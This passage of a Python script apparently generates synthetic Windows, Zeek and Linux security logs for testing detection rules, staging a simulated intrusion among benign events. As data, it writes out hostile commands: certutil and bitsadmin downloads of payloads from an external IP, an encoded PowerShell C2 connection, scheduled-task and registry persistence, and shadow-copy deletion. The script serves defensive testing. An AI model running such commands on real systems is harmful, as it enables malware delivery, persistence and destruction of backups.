"""
Cyberion ThreatShield | scripts/generate_telemetry.py
====================================================
Generates three realistic security telemetry datasets for detection-engineering
validation purposes. All events are synthetic but modelled on real-world schemas:
  - Windows Security & Sysmon  (EVTX-ATTACK-SAMPLES / Mordor / OTRF schema)
  - Zeek conn.log / dns.log / http.log
  - Linux auth.log / auditd

Network topology
----------------
  10.20.1.15   WS-FIN-04   (compromised Windows workstation)
  10.20.1.22   WS-DEV-02   (Windows workstation - lateral movement target)
  10.20.0.10   DC-PROD-01  (domain controller)
  10.20.2.50   SRV-DB-01   (database server)
  185.220.101.45            (external C2 - cdn-update-check.com)
  91.214.124.88             (SSH spray source / secondary C2)
  45.133.1.92               (exfiltration endpoint)
"""

import json
import os
import uuid
from datetime import datetime, timedelta

# ---------------------------------------------------------------------------
# Output paths
# ---------------------------------------------------------------------------
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATASETS_DIR = os.path.join(BASE_DIR, "datasets")
os.makedirs(DATASETS_DIR, exist_ok=True)

WIN_OUT   = os.path.join(DATASETS_DIR, "windows_security_sysmon_sample.json")
ZEEK_OUT  = os.path.join(DATASETS_DIR, "zeek_network_sample.json")
LINUX_OUT = os.path.join(DATASETS_DIR, "linux_auth_auditd_sample.json")

# ---------------------------------------------------------------------------
# Timestamp helpers (all events anchor to August 2026 UTC)
# ---------------------------------------------------------------------------
T0 = datetime(2026, 8, 14, 8, 0, 0)  # campaign day-0 08:00 UTC

def ts(delta_minutes: float) -> str:
    return (T0 + timedelta(minutes=delta_minutes)).strftime("%Y-%m-%dT%H:%M:%S.000Z")

def uid() -> str:
    return str(uuid.uuid4()).upper()


# ===========================================================================
# 1.  WINDOWS SECURITY & SYSMON DATASET
# ===========================================================================

def build_windows_events() -> list:
    events = []

    # --- BENIGN BASELINE (~15 events) ---

    events.append({
        "EventID": 4624, "Channel": "Security",
        "TimeCreated": ts(-240),
        "Computer": "WS-DEV-02.cyberion.local",
        "SubjectUserName": "j.doe", "SubjectDomainName": "CYBERION",
        "TargetUserName": "j.doe", "TargetDomainName": "CYBERION",
        "LogonType": 2, "LogonProcessName": "User32",
        "AuthenticationPackageName": "Kerberos",
        "WorkstationName": "WS-DEV-02",
        "IpAddress": "10.20.1.22", "IpPort": "0",
        "ProcessId": "0x900", "ProcessName": "-",
        "description": "benign_interactive_logon"
    })
    events.append({
        "EventID": 4800, "Channel": "Security",
        "TimeCreated": ts(-235),
        "Computer": "WS-DEV-02.cyberion.local",
        "SubjectUserName": "j.doe", "SubjectDomainName": "CYBERION",
        "description": "benign_workstation_lock"
    })
    events.append({
        "EventID": 4624, "Channel": "Security",
        "TimeCreated": ts(-200),
        "Computer": "DC-PROD-01.cyberion.local",
        "SubjectUserName": "SYSTEM", "SubjectDomainName": "NT AUTHORITY",
        "TargetUserName": "svc_monitor", "TargetDomainName": "CYBERION",
        "LogonType": 3, "LogonProcessName": "NtLmSsp",
        "AuthenticationPackageName": "NTLM",
        "WorkstationName": "WS-MON-01",
        "IpAddress": "10.20.3.11", "IpPort": "49231",
        "ProcessId": "0x0", "ProcessName": "-",
        "description": "benign_service_network_logon"
    })
    events.append({
        "EventID": 4688, "Channel": "Security",
        "TimeCreated": ts(-195),
        "Computer": "WS-DEV-02.cyberion.local",
        "SubjectUserName": "j.doe", "SubjectDomainName": "CYBERION",
        "NewProcessName": "C:\\Windows\\System32\\PING.EXE",
        "CommandLine": "ping -n 4 8.8.8.8",
        "ProcessId": "0x1a40",
        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "description": "benign_ping"
    })
    events.append({
        "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
        "TimeCreated": ts(-190),
        "Computer": "WS-FIN-04.cyberion.local",
        "User": "CYBERION\\a.rao",
        "Image": "C:\\Windows\\System32\\notepad.exe",
        "CommandLine": "notepad.exe C:\\Users\\a.rao\\Documents\\q3_report.txt",
        "ParentImage": "C:\\Windows\\explorer.exe",
        "ProcessGuid": uid(), "ParentProcessGuid": uid(),
        "ProcessId": 5012, "ParentProcessId": 3204,
        "Hashes": "MD5=f4b4e3a1c8d8a7be5e7e3cfd1a2b3c4d",
        "description": "benign_notepad"
    })
    events.append({
        "EventID": 4688, "Channel": "Security",
        "TimeCreated": ts(-180),
        "Computer": "DC-PROD-01.cyberion.local",
        "SubjectUserName": "m.smith", "SubjectDomainName": "CYBERION",
        "NewProcessName": "C:\\Windows\\System32\\schtasks.exe",
        "CommandLine": "schtasks /query /fo LIST /v",
        "ProcessId": "0x2b10",
        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "description": "benign_schtasks_query"
    })
    events.append({
        "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
        "TimeCreated": ts(-170),
        "Computer": "WS-DEV-02.cyberion.local",
        "User": "CYBERION\\j.doe",
        "Image": "C:\\Windows\\System32\\nslookup.exe",
        "CommandLine": "nslookup cyberion.local",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "ProcessGuid": uid(), "ParentProcessGuid": uid(),
        "ProcessId": 6142, "ParentProcessId": 4900,
        "description": "benign_nslookup"
    })
    events.append({
        "EventID": 4634, "Channel": "Security",
        "TimeCreated": ts(-160),
        "Computer": "WS-FIN-04.cyberion.local",
        "SubjectUserName": "a.rao", "SubjectDomainName": "CYBERION",
        "LogonType": 2,
        "description": "benign_logoff"
    })
    events.append({
        "EventID": 4624, "Channel": "Security",
        "TimeCreated": ts(-150),
        "Computer": "WS-FIN-04.cyberion.local",
        "SubjectUserName": "SYSTEM", "SubjectDomainName": "NT AUTHORITY",
        "TargetUserName": "helpdesk_svc", "TargetDomainName": "CYBERION",
        "LogonType": 10, "LogonProcessName": "User32",
        "AuthenticationPackageName": "Kerberos",
        "WorkstationName": "HELPDESK-01",
        "IpAddress": "10.20.4.5", "IpPort": "54321",
        "ProcessId": "0x0", "ProcessName": "-",
        "description": "benign_rdp_helpdesk"
    })
    events.append({
        "EventID": 4688, "Channel": "Security",
        "TimeCreated": ts(-140),
        "Computer": "WS-DEV-02.cyberion.local",
        "SubjectUserName": "SYSTEM", "SubjectDomainName": "NT AUTHORITY",
        "NewProcessName": "C:\\Windows\\System32\\msiexec.exe",
        "CommandLine": "msiexec.exe /i C:\\Temp\\update.msi /quiet",
        "ProcessId": "0x3c20",
        "ParentProcessName": "C:\\Windows\\System32\\services.exe",
        "description": "benign_msiexec_update"
    })
    events.append({
        "EventID": 4688, "Channel": "Security",
        "TimeCreated": ts(-130),
        "Computer": "DC-PROD-01.cyberion.local",
        "SubjectUserName": "SYSTEM", "SubjectDomainName": "NT AUTHORITY",
        "NewProcessName": "C:\\Windows\\System32\\gpupdate.exe",
        "CommandLine": "gpupdate /force",
        "ProcessId": "0x4d30",
        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "description": "benign_gpupdate"
    })
    events.append({
        "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
        "TimeCreated": ts(-120),
        "Computer": "WS-FIN-04.cyberion.local",
        "User": "NT AUTHORITY\\SYSTEM",
        "Image": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2401.0\\MsMpEng.exe",
        "CommandLine": "MsMpEng.exe",
        "ParentImage": "C:\\Windows\\System32\\services.exe",
        "ProcessGuid": uid(), "ParentProcessGuid": uid(),
        "ProcessId": 1584, "ParentProcessId": 636,
        "description": "benign_defender_scan"
    })
    events.append({
        "EventID": 4688, "Channel": "Security",
        "TimeCreated": ts(-115),
        "Computer": "SRV-DB-01.cyberion.local",
        "SubjectUserName": "db_admin", "SubjectDomainName": "CYBERION",
        "NewProcessName": "C:\\Windows\\System32\\NETSTAT.EXE",
        "CommandLine": "netstat -an",
        "ProcessId": "0x5e10",
        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "description": "benign_netstat"
    })
    events.append({
        "EventID": 4688, "Channel": "Security",
        "TimeCreated": ts(-110),
        "Computer": "WS-FIN-04.cyberion.local",
        "SubjectUserName": "a.rao", "SubjectDomainName": "CYBERION",
        "NewProcessName": "C:\\Windows\\System32\\ipconfig.exe",
        "CommandLine": "ipconfig /all",
        "ProcessId": "0x6f20",
        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "description": "benign_ipconfig"
    })
    events.append({
        "EventID": 4688, "Channel": "Security",
        "TimeCreated": ts(-105),
        "Computer": "DC-PROD-01.cyberion.local",
        "SubjectUserName": "m.smith", "SubjectDomainName": "CYBERION",
        "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": "powershell.exe -NoProfile Get-Date",
        "ProcessId": "0x7a30",
        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "description": "benign_powershell_getdate"
    })

    # --- ATTACK: Brute Force + Successful Logon (T1110 / T1078) ---
    for i in range(5):
        events.append({
            "EventID": 4625, "Channel": "Security",
            "TimeCreated": ts(i * 0.5),
            "Computer": "DC-PROD-01.cyberion.local",
            "SubjectUserName": "-", "SubjectDomainName": "-",
            "TargetUserName": "svc_backup", "TargetDomainName": "CYBERION",
            "Status": "0xC000006D", "SubStatus": "0xC000006A",
            "FailureReason": "%%2313",
            "LogonType": 3, "LogonProcessName": "NtLmSsp",
            "AuthenticationPackageName": "NTLM",
            "WorkstationName": "-",
            "IpAddress": "185.220.101.45", "IpPort": str(49000 + i * 13),
            "description": f"brute_force_failed_logon_{i+1}"
        })
    events.append({
        "EventID": 4624, "Channel": "Security",
        "TimeCreated": ts(3.0),
        "Computer": "DC-PROD-01.cyberion.local",
        "SubjectUserName": "SYSTEM", "SubjectDomainName": "NT AUTHORITY",
        "TargetUserName": "svc_backup", "TargetDomainName": "CYBERION",
        "LogonType": 3, "LogonProcessName": "NtLmSsp",
        "AuthenticationPackageName": "NTLM",
        "WorkstationName": "-",
        "IpAddress": "185.220.101.45", "IpPort": "49100",
        "ProcessId": "0x0", "ProcessName": "-",
        "LogonGuid": uid(),
        "description": "successful_brute_force_svc_backup"
    })
    for i in range(3):
        events.append({
            "EventID": 4625, "Channel": "Security",
            "TimeCreated": ts(4.0 + i * 0.3),
            "Computer": "WS-FIN-04.cyberion.local",
            "SubjectUserName": "-", "SubjectDomainName": "-",
            "TargetUserName": "j.doe", "TargetDomainName": "CYBERION",
            "Status": "0xC000006D", "SubStatus": "0xC000006A",
            "FailureReason": "%%2313",
            "LogonType": 10, "LogonProcessName": "User32",
            "AuthenticationPackageName": "Kerberos",
            "WorkstationName": "-",
            "IpAddress": "185.220.101.45", "IpPort": str(50100 + i * 7),
            "description": f"rdp_brute_force_failed_{i+1}"
        })
    events.append({
        "EventID": 4624, "Channel": "Security",
        "TimeCreated": ts(5.2),
        "Computer": "WS-FIN-04.cyberion.local",
        "SubjectUserName": "SYSTEM", "SubjectDomainName": "NT AUTHORITY",
        "TargetUserName": "j.doe", "TargetDomainName": "CYBERION",
        "LogonType": 10, "LogonProcessName": "User32",
        "AuthenticationPackageName": "Kerberos",
        "WorkstationName": "-",
        "IpAddress": "185.220.101.45", "IpPort": "50200",
        "ProcessId": "0x0", "ProcessName": "-",
        "LogonGuid": uid(),
        "description": "successful_rdp_j.doe_compromise"
    })

    # --- ATTACK: Execution (T1059.001 / T1105 / T1197) ---
    ENCODED_CMD = ("JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0A"
                   "LgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUA"
                   "LgAyADIAMAAuADEAMAAxAC4ANAA1ACIALAA0ADQAMwApAA==")
    events.append({
        "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
        "TimeCreated": ts(6.0),
        "Computer": "WS-FIN-04.cyberion.local",
        "User": "CYBERION\\j.doe",
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {ENCODED_CMD}",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "ProcessGuid": uid(), "ParentProcessGuid": uid(),
        "ProcessId": 7788, "ParentProcessId": 7200,
        "Hashes": "MD5=9b71d224bd62f3785d96d46ad3ea3d73",
        "description": "powershell_encoded_command_c2_connect"
    })
    events.append({
        "EventID": 4688, "Channel": "Security",
        "TimeCreated": ts(6.1),
        "Computer": "WS-FIN-04.cyberion.local",
        "SubjectUserName": "j.doe", "SubjectDomainName": "CYBERION",
        "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {ENCODED_CMD}",
        "ProcessId": "0x1e6c",
        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "description": "4688_powershell_encoded"
    })
    events.append({
        "EventID": 4688, "Channel": "Security",
        "TimeCreated": ts(6.5),
        "Computer": "WS-FIN-04.cyberion.local",
        "SubjectUserName": "j.doe", "SubjectDomainName": "CYBERION",
        "NewProcessName": "C:\\Windows\\System32\\whoami.exe",
        "CommandLine": "whoami /priv",
        "ProcessId": "0x1e80",
        "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "description": "whoami_priv_discovery"
    })
    events.append({
        "EventID": 4688, "Channel": "Security",
        "TimeCreated": ts(7.0),
        "Computer": "WS-FIN-04.cyberion.local",
        "SubjectUserName": "j.doe", "SubjectDomainName": "CYBERION",
        "NewProcessName": "C:\\Windows\\System32\\certutil.exe",
        "CommandLine": "certutil.exe -urlcache -split -f http://185.220.101.45/payload.exe C:\\Users\\j.doe\\AppData\\Local\\Temp\\svchost32.exe",
        "ProcessId": "0x1f00",
        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "description": "certutil_download_cradle"
    })
    events.append({
        "EventID": 4688, "Channel": "Security",
        "TimeCreated": ts(7.5),
        "Computer": "WS-FIN-04.cyberion.local",
        "SubjectUserName": "j.doe", "SubjectDomainName": "CYBERION",
        "NewProcessName": "C:\\Windows\\System32\\bitsadmin.exe",
        "CommandLine": "bitsadmin /transfer svcupdate /download /priority high http://185.220.101.45/update.dll C:\\Windows\\Temp\\update.dll",
        "ProcessId": "0x1f10",
        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "description": "bitsadmin_download"
    })

    # --- ATTACK: Persistence (T1053.005 / T1547.001) ---
    events.append({
        "EventID": 4688, "Channel": "Security",
        "TimeCreated": ts(8.0),
        "Computer": "WS-FIN-04.cyberion.local",
        "SubjectUserName": "j.doe", "SubjectDomainName": "CYBERION",
        "NewProcessName": "C:\\Windows\\System32\\schtasks.exe",
        "CommandLine": 'schtasks /create /sc MINUTE /mo 5 /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\update.dll" /ru SYSTEM /f',
        "ProcessId": "0x2000",
        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "description": "schtasks_persistence_create"
    })
    events.append({
        "EventID": 4688, "Channel": "Security",
        "TimeCreated": ts(8.5),
        "Computer": "WS-FIN-04.cyberion.local",
        "SubjectUserName": "j.doe", "SubjectDomainName": "CYBERION",
        "NewProcessName": "C:\\Windows\\System32\\reg.exe",
        "CommandLine": 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSvcHost /t REG_SZ /d "C:\\Windows\\Temp\\update.dll" /f',
        "ProcessId": "0x2010",
        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "description": "reg_run_key_persistence"
    })
    events.append({
        "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
        "TimeCreated": ts(8.6),
        "Computer": "WS-FIN-04.cyberion.local",
        "User": "CYBERION\\j.doe",
        "Image": "C:\\Windows\\System32\\reg.exe",
        "CommandLine": 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSvcHost /t REG_SZ /d "C:\\Windows\\Temp\\update.dll" /f',
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "ProcessGuid": uid(), "ParentProcessGuid": uid(),
        "ProcessId": 8208, "ParentProcessId": 7200,
        "description": "sysmon1_reg_run_key"
    })

    # --- ATTACK: Account Creation (T1136) ---
    events.append({
        "EventID": 4720, "Channel": "Security",
        "TimeCreated": ts(9.0),
        "Computer": "WS-FIN-04.cyberion.local",
        "SubjectUserName": "j.doe", "SubjectDomainName": "CYBERION",
        "TargetUserName": "support_adm",
        "TargetDomainName": "WS-FIN-04",
        "TargetSid": "S-1-5-21-3456789012-1234567890-2345678901-1001",
        "description": "new_local_account_support_adm"
    })
    events.append({
        "EventID": 4732, "Channel": "Security",
        "TimeCreated": ts(9.1),
        "Computer": "WS-FIN-04.cyberion.local",
        "SubjectUserName": "j.doe", "SubjectDomainName": "CYBERION",
        "TargetUserName": "support_adm",
        "TargetDomainName": "WS-FIN-04",
        "MemberSid": "S-1-5-21-3456789012-1234567890-2345678901-1001",
        "GroupName": "Administrators", "GroupDomain": "WS-FIN-04",
        "description": "account_added_to_administrators_support_adm"
    })

    # --- ATTACK: Kerberoasting (T1558.003) ---
    events.append({
        "EventID": 4769, "Channel": "Security",
        "TimeCreated": ts(10.0),
        "Computer": "DC-PROD-01.cyberion.local",
        "SubjectUserName": "j.doe", "SubjectUserDomain": "CYBERION",
        "ServiceName": "svc_mssql",
        "ServiceSid": "S-1-5-21-3456789012-1234567890-2345678901-1105",
        "TicketOptions": "0x40810000",
        "TicketEncryptionType": "0x17",
        "IpAddress": "::ffff:10.20.1.15", "IpPort": "55743",
        "description": "kerberoasting_rc4_svc_mssql"
    })
    events.append({
        "EventID": 4769, "Channel": "Security",
        "TimeCreated": ts(10.3),
        "Computer": "DC-PROD-01.cyberion.local",
        "SubjectUserName": "j.doe", "SubjectUserDomain": "CYBERION",
        "ServiceName": "svc_backup",
        "ServiceSid": "S-1-5-21-3456789012-1234567890-2345678901-1106",
        "TicketOptions": "0x40810000",
        "TicketEncryptionType": "0x17",
        "IpAddress": "::ffff:10.20.1.15", "IpPort": "55744",
        "description": "kerberoasting_rc4_svc_backup"
    })

    # --- ATTACK: LSASS Access (T1003.001) ---
    events.append({
        "EventID": 10, "Channel": "Microsoft-Windows-Sysmon/Operational",
        "TimeCreated": ts(11.0),
        "Computer": "WS-FIN-04.cyberion.local",
        "SourceImage": "C:\\Windows\\System32\\rundll32.exe",
        "SourceProcessGuid": uid(),
        "SourceProcessId": 8912,
        "SourceUser": "CYBERION\\j.doe",
        "TargetImage": "C:\\Windows\\System32\\lsass.exe",
        "TargetProcessGuid": uid(),
        "TargetProcessId": 640,
        "TargetUser": "NT AUTHORITY\\SYSTEM",
        "GrantedAccess": "0x1010",
        "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+0x6cc04|C:\\Windows\\SYSTEM32\\KERNELBASE.dll+0x198e8",
        "description": "lsass_access_rundll32_0x1010"
    })
    events.append({
        "EventID": 10, "Channel": "Microsoft-Windows-Sysmon/Operational",
        "TimeCreated": ts(11.5),
        "Computer": "WS-FIN-04.cyberion.local",
        "SourceImage": "C:\\Windows\\Temp\\procdump64.exe",
        "SourceProcessGuid": uid(),
        "SourceProcessId": 9100,
        "SourceUser": "CYBERION\\j.doe",
        "TargetImage": "C:\\Windows\\System32\\lsass.exe",
        "TargetProcessGuid": uid(),
        "TargetProcessId": 640,
        "TargetUser": "NT AUTHORITY\\SYSTEM",
        "GrantedAccess": "0x1fffff",
        "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+0x6cc04|C:\\Windows\\Temp\\procdump64.exe+0x3b21",
        "description": "lsass_access_procdump64_full"
    })

    # --- ATTACK: SMB Lateral Movement (T1021.002) ---
    events.append({
        "EventID": 5140, "Channel": "Security",
        "TimeCreated": ts(12.0),
        "Computer": "WS-DEV-02.cyberion.local",
        "SubjectUserName": "support_adm", "SubjectDomainName": "WS-FIN-04",
        "ObjectType": "File", "ShareName": "\\\\*\\ADMIN$",
        "ShareLocalPath": "C:\\Windows",
        "AccessMask": "0x1",
        "IpAddress": "10.20.1.15", "IpPort": "49812",
        "description": "smb_admin_share_access_lateral"
    })
    events.append({
        "EventID": 5140, "Channel": "Security",
        "TimeCreated": ts(12.2),
        "Computer": "DC-PROD-01.cyberion.local",
        "SubjectUserName": "support_adm", "SubjectDomainName": "WS-FIN-04",
        "ObjectType": "File", "ShareName": "\\\\*\\C$",
        "ShareLocalPath": "C:\\",
        "AccessMask": "0x1",
        "IpAddress": "10.20.1.15", "IpPort": "49900",
        "description": "smb_c_share_access_dc"
    })
    events.append({
        "EventID": 5145, "Channel": "Security",
        "TimeCreated": ts(12.4),
        "Computer": "DC-PROD-01.cyberion.local",
        "SubjectUserName": "support_adm", "SubjectDomainName": "WS-FIN-04",
        "ObjectType": "File",
        "ShareName": "\\\\*\\C$",
        "RelativeTargetName": "Windows\\System32\\config\\SAM",
        "AccessMask": "0x120089",
        "IpAddress": "10.20.1.15", "IpPort": "49901",
        "description": "smb_c_share_sam_access"
    })

    # --- ATTACK: VSS Delete (T1490) ---
    events.append({
        "EventID": 4688, "Channel": "Security",
        "TimeCreated": ts(13.0),
        "Computer": "WS-FIN-04.cyberion.local",
        "SubjectUserName": "support_adm", "SubjectDomainName": "WS-FIN-04",
        "NewProcessName": "C:\\Windows\\System32\\vssadmin.exe",
        "CommandLine": "vssadmin delete shadows /all /quiet",
        "ProcessId": "0x2a20",
        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "description": "vssadmin_delete_shadows"
    })
    events.append({
        "EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
        "TimeCreated": ts(13.1),
        "Computer": "WS-FIN-04.cyberion.local",
        "User": "WS-FIN-04\\support_adm",
        "Image": "C:\\Windows\\System32\\vssadmin.exe",
        "CommandLine": "vssadmin delete shadows /all /quiet",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "ProcessGuid": uid(), "ParentProcessGuid": uid(),
        "ProcessId": 10784, "ParentProcessId": 8200,
        "description": "sysmon1_vssadmin_delete"
    })
    # Benign: net user enumeration by IT admin (baseline noise for FP testing)
    events.append({
        "EventID": 4688, "Channel": "Security",
        "TimeCreated": ts(-100),
        "Computer": "DC-PROD-01.cyberion.local",
        "SubjectUserName": "helpdesk_svc", "SubjectDomainName": "CYBERION",
        "NewProcessName": "C:\\Windows\\System32\\net.exe",
        "CommandLine": "net user /domain",
        "ProcessId": "0x8b40",
        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "description": "benign_net_user_domain_query"
    })

    return events


# ===========================================================================
# 2.  ZEEK NETWORK DATASET
# ===========================================================================

def build_zeek_events() -> list:
    events = []

    # C2 beaconing - HTTPS every ~60s with jitter
    for i in range(8):
        jitter_s = (i % 3) * 7
        conn_ts = T0 + timedelta(minutes=i * 1.0, seconds=jitter_s)
        events.append({
            "log_type": "conn",
            "ts": conn_ts.strftime("%Y-%m-%dT%H:%M:%S.000Z"),
            "uid": f"CBeacon{i:04d}",
            "id.orig_h": "10.20.1.15",
            "id.orig_p": 50100 + i,
            "id.resp_h": "185.220.101.45",
            "id.resp_p": 443,
            "proto": "tcp",
            "service": "ssl",
            "duration": round(0.28 + i * 0.003, 3),
            "orig_bytes": 248 + i * 4,
            "resp_bytes": 512 + i * 8,
            "conn_state": "SF",
            "missed_bytes": 0,
            "history": "ShADadFf",
            "orig_pkts": 6,
            "resp_pkts": 5,
            "description": f"c2_https_beacon_{i+1}"
        })

    # DNS tunneling - TXT queries
    tunnel_subdomains = [
        "cmd-aHR0cHM6Ly9jMi5leGFtcGxlLmNvbQ.tunnel.cdn-update-check.com",
        "data-d3dvbmRlcmZ1bCBkYXRh.tunnel.cdn-update-check.com",
        "exec-cGluZyAxODUuMjIwLjEwMS40NQ.tunnel.cdn-update-check.com",
        "resp-b2sgY29ubmVjdGVk.tunnel.cdn-update-check.com",
    ]
    for i, sub in enumerate(tunnel_subdomains):
        events.append({
            "log_type": "dns",
            "ts": ts(20.0 + i * 0.5),
            "uid": f"CDNSTunnel{i:04d}",
            "id.orig_h": "10.20.1.15",
            "id.orig_p": 54321 + i,
            "id.resp_h": "10.20.0.2",
            "id.resp_p": 53,
            "proto": "udp",
            "trans_id": 10000 + i * 37,
            "rtt": round(0.003 + i * 0.001, 4),
            "query": sub,
            "qclass": 1, "qclass_name": "C_INTERNET",
            "qtype": 16, "qtype_name": "TXT",
            "rcode": 0, "rcode_name": "NOERROR",
            "AA": False, "TC": False, "RD": True, "RA": True, "Z": 0,
            "answers": [f"data_chunk_{i}_base64encoded"],
            "TTLs": [60],
            "rejected": False,
            "description": f"dns_tunnel_txt_query_{i+1}"
        })

    # Exfiltration - large outbound port 8443
    events.append({
        "log_type": "conn",
        "ts": ts(25.0),
        "uid": "CExfil0001",
        "id.orig_h": "10.20.1.15",
        "id.orig_p": 51444,
        "id.resp_h": "45.133.1.92",
        "id.resp_p": 8443,
        "proto": "tcp",
        "service": None,
        "duration": 42.7,
        "orig_bytes": 54321890,
        "resp_bytes": 1024,
        "conn_state": "SF",
        "missed_bytes": 0,
        "history": "ShADadFf",
        "orig_pkts": 39104,
        "resp_pkts": 22,
        "description": "large_outbound_exfil_port_8443"
    })
    events.append({
        "log_type": "conn",
        "ts": ts(26.0),
        "uid": "CExfil0002",
        "id.orig_h": "10.20.1.22",
        "id.orig_p": 52001,
        "id.resp_h": "45.133.1.92",
        "id.resp_p": 8443,
        "proto": "tcp",
        "service": None,
        "duration": 18.3,
        "orig_bytes": 21456000,
        "resp_bytes": 512,
        "conn_state": "SF",
        "missed_bytes": 0,
        "history": "ShADadFf",
        "orig_pkts": 15400,
        "resp_pkts": 14,
        "description": "exfil_ws_dev02_port_8443"
    })

    # Internal SMB lateral movement
    smb_pairs = [
        ("10.20.1.15", "10.20.1.22", 49812),
        ("10.20.1.15", "10.20.0.10", 49900),
        ("10.20.1.22", "10.20.0.10", 49950),
    ]
    for i, (src, dst, sport) in enumerate(smb_pairs):
        events.append({
            "log_type": "conn",
            "ts": ts(30.0 + i * 0.3),
            "uid": f"CSMB{i:04d}",
            "id.orig_h": src,
            "id.orig_p": sport,
            "id.resp_h": dst,
            "id.resp_p": 445,
            "proto": "tcp",
            "service": "smb",
            "duration": round(1.2 + i * 0.4, 2),
            "orig_bytes": 4096 + i * 512,
            "resp_bytes": 2048 + i * 256,
            "conn_state": "SF",
            "missed_bytes": 0,
            "history": "ShADadFf",
            "orig_pkts": 12 + i,
            "resp_pkts": 8 + i,
            "description": f"smb_lateral_movement_{i+1}"
        })

    # RDP lateral movement
    rdp_pairs = [
        ("10.20.1.15", "10.20.1.22", 50001),
        ("10.20.1.15", "10.20.0.10", 50002),
    ]
    for i, (src, dst, sport) in enumerate(rdp_pairs):
        events.append({
            "log_type": "conn",
            "ts": ts(31.0 + i * 0.5),
            "uid": f"CRDP{i:04d}",
            "id.orig_h": src,
            "id.orig_p": sport,
            "id.resp_h": dst,
            "id.resp_p": 3389,
            "proto": "tcp",
            "service": "rdp",
            "duration": round(120.0 + i * 30.0, 1),
            "orig_bytes": 204800 + i * 51200,
            "resp_bytes": 409600 + i * 102400,
            "conn_state": "SF",
            "missed_bytes": 0,
            "history": "ShADadFf",
            "orig_pkts": 1024 + i * 256,
            "resp_pkts": 2048 + i * 512,
            "description": f"rdp_lateral_movement_{i+1}"
        })

    # HTTP C2 callbacks
    http_paths = [
        "/api/v2/config/check",
        "/cdn-cgi/health",
        "/api/v2/task/get",
        "/api/v2/result/post",
    ]
    for i, path in enumerate(http_paths):
        events.append({
            "log_type": "http",
            "ts": ts(7.0 + i * 0.2),
            "uid": f"CHTTPBeacon{i:04d}",
            "id.orig_h": "10.20.1.15",
            "id.orig_p": 51000 + i,
            "id.resp_h": "185.220.101.45",
            "id.resp_p": 443,
            "trans_depth": 1,
            "method": "POST" if "result" in path else "GET",
            "host": "cdn-update-check.com",
            "uri": path,
            "referrer": "-",
            "version": "1.1",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "request_body_len": 256 if "post" in path else 0,
            "response_body_len": 512,
            "status_code": 200,
            "status_msg": "OK",
            "resp_mime_types": ["application/json"],
            "description": f"http_c2_callback_{i+1}"
        })

    # Benign DNS traffic
    benign_dns = [
        ("microsoft.com", "A"), ("github.com", "A"),
        ("cyberion.local", "A"), ("update.microsoft.com", "A"),
    ]
    for i, (qname, qtype_name) in enumerate(benign_dns):
        events.append({
            "log_type": "dns",
            "ts": ts(-50.0 + i * 10),
            "uid": f"CBenignDNS{i:04d}",
            "id.orig_h": "10.20.1.22",
            "id.orig_p": 53000 + i,
            "id.resp_h": "10.20.0.2",
            "id.resp_p": 53,
            "proto": "udp",
            "query": qname,
            "qtype_name": qtype_name,
            "rcode_name": "NOERROR",
            "answers": [f"104.215.{i+1}.1"],
            "TTLs": [300],
            "description": f"benign_dns_{qname}"
        })
    events.append({
        "log_type": "http",
        "ts": ts(-45.0),
        "uid": "CBenignHTTP0001",
        "id.orig_h": "10.20.1.22",
        "id.orig_p": 49500,
        "id.resp_h": "104.208.16.88",
        "id.resp_p": 443,
        "method": "GET",
        "host": "github.com",
        "uri": "/",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "status_code": 200,
        "description": "benign_https_github"
    })

    return events


# ===========================================================================
# 3.  LINUX AUTH / AUDITD DATASET
# ===========================================================================

def build_linux_events() -> list:
    events = []

    # Benign: SSH key-based logins
    benign_users = [("devops", "10.20.1.22"), ("sre_bot", "10.20.3.10"), ("m.smith", "10.20.4.5")]
